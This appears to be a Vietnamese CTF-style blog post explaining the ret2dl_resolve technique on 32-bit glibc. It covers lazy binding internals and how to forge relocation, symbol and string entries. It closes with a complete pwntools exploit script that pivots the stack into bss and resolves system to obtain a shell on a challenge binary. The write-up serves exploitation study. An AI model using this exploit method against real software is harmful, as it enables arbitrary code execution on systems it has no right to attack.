---
title: "ret2dl_resolve note"
date: 2024-01-29
draft: false
tags: ["overflow", "pwn"]
showTableOfContents: true
---
{{< alert >}}
**Images not loading?** Try accessing this site using a VPN.
{{< /alert >}}

Trong một số trường hợp khi ta overflow mà không có các hàm trong PLT thích hợp để leak libc ra thì ret2dl_resolve là một kỹ thuật để lấy được shell. Trong bài này mình sẽ giới thiệu tóm tắt về cách ret2dl_resolve ở glibc 2.37 hoạt động qua một bài demo.

## I. Prerequisites :
Do nếu mình giải thích chi tiết từng dòng code chạy sau thì nó rất rất dài và giống như reinvent the wheel nên các bạn có thể đọc trước ở đây:
- [syst3mfailure](https://syst3mfailure.io/ret2dl_resolve/) - Phân tích chi tiết từng dòng 
- [phrack article ở mục 5](http://phrack.org/issues/58/4.html) - bài original public về kỹ thuật này 
- [ricardo2197](https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62) - Bài khá hay tóm tắt về nó
- [file](https://www.da.vidbuchanan.co.uk/blog/static/babystack.tar.gz) binary mình demo

## II. Overview
Kỹ thuật này lợi dụng việc lazy binding tức quá trình resolve symbol ở runtime không có bound check từ đó ta khiến nó overwrite địa chỉ GOT của một hàm nào đó thành `system`

![](https://hackmd.io/_uploads/rJeZGIMi3.png)

Khi ta gọi hàm `read` thì những việc sau đây xảy ra :

1. Nhảy vào .plt của `read` 
2. jmp vào một địa chỉ trong `.got.plt`. 
3. Nếu địa chỉ này chưa resolve thì nó sẽ trỏ ngược lại vào địa chỉ tiếp theo cần thực hiện trong `.plt`. Nếu resolve rồi thì thực hiện nó
4. Nếu chưa resolve thì bước này là bước đi resolve

Trong quá trình đi resolve nó sẽ push 2 arguments lên stack : `linkmap` và `reloc_arg`.
- `linkmap` là chỗ chứa các địa chỉ ở bên dưới - ở đây ta không quan tâm về nó
![](https://hackmd.io/_uploads/By-vOLMsn.png)
- `reloc_arg` dùng để tính offset mà ta cần cực kỳ để ý.

Mục tiêu của ret2dl_resolve như sau:
- Fake argument `reloc_arg` 
- Fake 3 chunk STRTAB, SYMTAB,JMPREL

Để fake đúng ta cần tính offset **chuẩn** . 3 chunk ta fake thường nằm ở heap hoặc bss của binary. Đây là địa chỉ mà ta phải có control hoàn toàn.
Lưu ý : địa sym và SYMTAB, reloc và JMPREL mà mình đề cập bên dưới là các địa chỉ khác nhau hoàn toàn.

## III. Details:
### a. STRTAB

```clike=
gef➤  x/10s 0x804822c
0x804822c:      ""
0x804822d:      "libc.so.6"
0x8048237:      "_IO_stdin_used"
0x8048246:      "read"
0x804824b:      "alarm"
0x8048251:      "__libc_start_main"
0x8048263:      "__gmon_start__"
0x8048272:      "GLIBC_2.0"
0x804827c:      ""
0x804827d:      ""
```

STRTAB chỉ là nơi chứa strings. Mục tiêu của ta khi fake nó chỉ là ghi `system\x00` (null terminated str) vào một địa chỉ

### b. SYMTAB

Một chunk sym được định nghĩa như sau:
- Ở x64
```clike=
typedef struct
{
  Elf64_Word	st_name;		/* Symbol name (string tbl index) */
  unsigned char	st_info;		/* Symbol type and binding */
  unsigned char st_other;		/* Symbol visibility */
  Elf64_Section	st_shndx;		/* Section index */
  Elf64_Addr	st_value;		/* Symbol value */
  Elf64_Xword	st_size;		/* Symbol size */
} Elf64_Sym;
```
- Ở x32
```clike=
typedef struct
{
  Elf32_Word	st_name;		/* Symbol name (string tbl index) */
  Elf32_Addr	st_value;		/* Symbol value */
  Elf32_Word	st_size;		/* Symbol size */
  unsigned char	st_info;		/* Symbol type and binding */
  unsigned char	st_other;		/* Symbol visibility */
  Elf32_Section	st_shndx;		/* Section index */
} Elf32_Sym;
```

Cách mà source tính ra chunk này : 
```clike=
const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)]
// which is the same as :
const ElfW(Sym) *sym = &symtab[(reloc->r_info) >> 8]
// also the same as :
*sym = SYMTAB + index *sizeof(sym)
// index = (reloc->r_info) >> 8

----------------------------------------------
const ElfW(Sym) *const symtab
    = (const void *) D_PTR (l, l_info[DT_SYMTAB])
                      --------SYMTAB--------
```

x64 và x32 chỉ khác mỗi size còn lại tương tự

![](https://hackmd.io/_uploads/HkdIp8zoh.png)

Ở đây chúng ta chỉ quan tâm đến `st_other` và `st_name`
- `st_other` : bắt buộc = 0
- `st_name` : chứa offset đến string `system` mà ta fake

### c. JMPREL

Một chunk reloc được định nghĩa như sau : 
- x32
```c=

typedef struct
{
  Elf32_Addr	r_offset;		/* Address */
  Elf32_Word	r_info;			/* Relocation type and symbol index */
} Elf32_Rel;
```

- x64
```c=
typedef struct
{
  Elf64_Addr	r_offset;		/* Address */
  Elf64_Xword	r_info;			/* Relocation type and symbol index */
} Elf64_Rel;
```
Cách mà source tính ra chunk này:
```c=
const PLTREL *const reloc = (const void *) (D_PTR(l, l_info[DT_JMPREL]) + reloc_offset);
// the same as
reloc = JMPREL + reloc_offset
// such that
reloc_offset = reloc_arg //x32
reloc_offset = reloc_arg *0x18 //x64
```

![](https://hackmd.io/_uploads/SJWzMvGo3.png)


## III. But howww ???
### a. Basic algorithm (true case)
Trong trường hợp thoả mãn tất cả điều kiện thì nó sẽ resolve bằng thuật toán sau
1. push `reloc_arg`, `linkmap`
2. get `SYMTAB` address
3. get `STRTAB` address
4. get a ptr to `ELF32_Rela` / `ELF64_Rela` struct
5. get a ptr to `ELF32_Sym` / `ELF64_Sym` struct (base on a ptr in step 4)
6. check `r_info` ending with 0x7 
7. check `st_other == 0` or not
8. do some stuff to check the version
9. get the address from glibc base on `STRTAB + st_name`

### b. Observation:
1. Ta không thể fake `SYMTAB`, `STRTAB` , `linkmap` (hmmm có thể có nhưng kỹ thuật khá khó)
2. Bước 4 tính ptr đó bằng công thức:  `reloc = JMPREL + reloc_arg` 
3. Bước 5 tính ptr đó bằng công thức `sym = SYMTAB + (r_info >> 8) * sizeof(sym)`

### c. Các bước tính:
1. Tìm 3 địa chỉ `addr1` , `addr2` ,`addr3` mà chúng ta có quyền control
2. Fake ELF32_Rela / ELF64_Rela `addr1` struct
- reloc_arg = `addr1`  - JMPREL **(x32)**
- reloc_arg = (`addr1`  - JMPREL) / 24 **(x64)**
-  r_info = (((`addr2` - SYMTAB) / sizeof(sym)) << 8) | 7
- `addr1` chunk : [GOT,  r_info]
3. Fake ELF32_Sym / ELF64_Sym `addr2` struct :
- st_name = `addr3` - STRTAB
- st_value, st_size, st_info, st_other, st_shndx = 0
4. write `system` to `addr3`

Trong quá trình fake thì các chunk đấy phải nằm đúng một ô nhớ 4 byte hoặc 8 byte ở một địa chỉ -> align khi thấy không phù hợp

## IV. Demo
Đầu tiên ta chạy lệnh này để note lại các giá trị 
```c!
$ readelf -d babystack

Dynamic section at offset 0xf14 contains 24 entries:
  Tag        Type                         Name/Value
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000c (INIT)                       0x80482c8
 0x0000000d (FINI)                       0x80484f4
 0x00000019 (INIT_ARRAY)                 0x8049f08
 0x0000001b (INIT_ARRAYSZ)               4 (bytes)
 0x0000001a (FINI_ARRAY)                 0x8049f0c
 0x0000001c (FINI_ARRAYSZ)               4 (bytes)
 0x6ffffef5 (GNU_HASH)                   0x80481ac
 0x00000005 (STRTAB)                     0x804822c
 0x00000006 (SYMTAB)                     0x80481cc
 0x0000000a (STRSZ)                      80 (bytes)
 0x0000000b (SYMENT)                     16 (bytes)
 0x00000015 (DEBUG)                      0x0
 0x00000003 (PLTGOT)                     0x804a000
 0x00000002 (PLTRELSZ)                   24 (bytes)
 0x00000014 (PLTREL)                     REL
 0x00000017 (JMPREL)                     0x80482b0
 0x00000011 (REL)                        0x80482a8
 0x00000012 (RELSZ)                      8 (bytes)
 0x00000013 (RELENT)                     8 (bytes)
 0x6ffffffe (VERNEED)                    0x8048288
 0x6fffffff (VERNEEDNUM)                 1
 0x6ffffff0 (VERSYM)                     0x804827c
 0x00000000 (NULL)                       0x0
```

Note lại
```python!
SYMTAB = 0x080481cc
STRTAB = 0x0804822c
JMPREL = 0x080482b0
```

Vào ida thì ta dễ dàng thấy rằng bị bof

![](https://hackmd.io/_uploads/BkDp5tGj3.png)

Vào gdb thì thấy rằng không có hàm nào thích hợp để giúp ta leak libc -> ret2dl_resolve

![](https://hackmd.io/_uploads/ByYZotfoh.png)

Sau một hồi test với binary thì thấy rằng ta cần pivot stack vào bss() do arguments 1 tức `reloc_arg` cần phải ở đầu stack

Quá trình pivot stack cũng như làm sau để bof 1 file x32 sẽ không trình bày ở đây

```python=
addr1 = 0x804af00
payload = b'a'*40 + p32(addr1)

payload +=  p32(exe.plt['read']) + p32(0x8048455)+  p32(0) + p32(addr1) + p32(0x80)
p.send(payload)
```

Trong đó `0x8048455` là gadget `leave_ret`. Ở đây chúng ta thực hiện ghi 2 lần. 
- Lần 1 tức payload trên để pivot stack
- Lần 2 gửi payload ret2dl_resolve lên bss()

Payload 2 của mình có dạng sau

![](https://hackmd.io/_uploads/HJUdgcMi2.png)


```python=
addr1 += 0x14
reloc_args = (addr1 - JMPREL)
addr2 = 0x804af1c
success("FAKE ELF32_SYM addr2 : " + hex(addr2))
r_info = (addr2- SYMTAB) // 16
r_info = (r_info <<8) | 0x7

success("FAKE ELF32_RELA addr1 : " + hex(addr1))
success("CACULATED reloc_args: " + hex(reloc_args))
success("r_info : " + hex(r_info))

string = 0x0804af2c - STRTAB
```

Do `addr1` sau khi chạy payload 1 đang là `rsp`
nên mình cộng thêm 0x14 tức chỗ để fake `ELF32_Rela` struct.

`string` trong code trên là `st_name` fake

Payload sau khi gửi 

![](https://hackmd.io/_uploads/S1i7M9Min.png)

Ta có thể thấy là các địa chỉ ta fake nằm trọn trong 1 ô vùng nhớ. Các địa chỉ khác tính như công thức mình đưa ra ở trên .

Chỗ padding này như sau

![](https://hackmd.io/_uploads/rJbymqMon.png)


- `0x804af08` là esp tức là `reloc_arg`
- 2 địa chỉ tiếp theo là phần padding. Ở đây mình gửi string `sh` và tiếp theo mình gửi vào `0x804af10` địa chỉ trỏ tới `sh`. Lý do của việc đó là vì khi ta thực hiện resolve xong thì nó sẽ thực hiện hàm `system` đấy. Do là x32 nên theo calling convention thì nó expect arguments ở `esp+0x8`

Ta chạy script thì lấy được shell

![](https://hackmd.io/_uploads/BySV4qzoh.png)


Full script : 
```python=
from pwn import *
import time
exe = ELF("babystack")
p = process(exe.path)

SYMTAB = 0x080481cc
STRTAB = 0x0804822c
JMPREL = 0x080482b0

GOT = 0x804a010
ret = 0x080482d2

addr1 = 0x804af00
payload = b'a'*40 + p32(addr1)

payload +=  p32(exe.plt['read']) + p32(0x8048455)+  p32(0) + p32(addr1) + p32(0x80)
p.send(payload)

time.sleep(1)

addr1 += 0x14
reloc_args = (addr1 - JMPREL)
success("FAKE ELF32_RELA addr1 : " + hex(addr1))
success("CACULATED reloc_args: " + hex(reloc_args))
addr2 = 0x804af1c
success("FAKE ELF32_SYM addr2 : " + hex(addr2))
r_info = (addr2- SYMTAB) // 16
r_info = (r_info <<8) | 0x7
success("r_info : " + hex(r_info))

string = 0x0804af2c - STRTAB
payload = b'a'*4 + p32(0x80482F0) + p32(reloc_args) + b'sh\x00\x00'+p32(0x0804af0c)
payload += p32(exe.got['read']) + p32(r_info)+p32(string)+p32(0)*3+b'system\x00'
p.send(payload)

p.interactive()
```

## V. References
1. [syst3mfailure](https://syst3mfailure.io/ret2dl_resolve/)
2. [phrack article ở mục 5](http://phrack.org/issues/58/4.html)
3. [ricardo2197](https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62) 